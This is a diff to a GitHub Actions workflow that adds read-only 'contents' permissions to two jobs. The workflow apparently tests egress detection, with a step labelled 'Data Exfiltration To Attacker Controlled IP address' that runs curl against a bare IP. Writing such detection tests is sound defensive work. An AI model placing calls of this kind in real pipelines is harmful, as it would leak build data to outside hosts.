@@ -4,6 +4,8 @@ on:
 
 jobs:
   direct-ip-hosted:
+    permissions:
+      contents: read
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
@@ -12,6 +14,8 @@ jobs:
       - name: Data Exfiltration To Attacker Controlled IP address
         run: curl 104.16.209.12 -L
   direct-ip-arc:
+    permissions:
+      contents: read
     runs-on: self-hosted
     steps:
       - uses: actions/checkout@v3
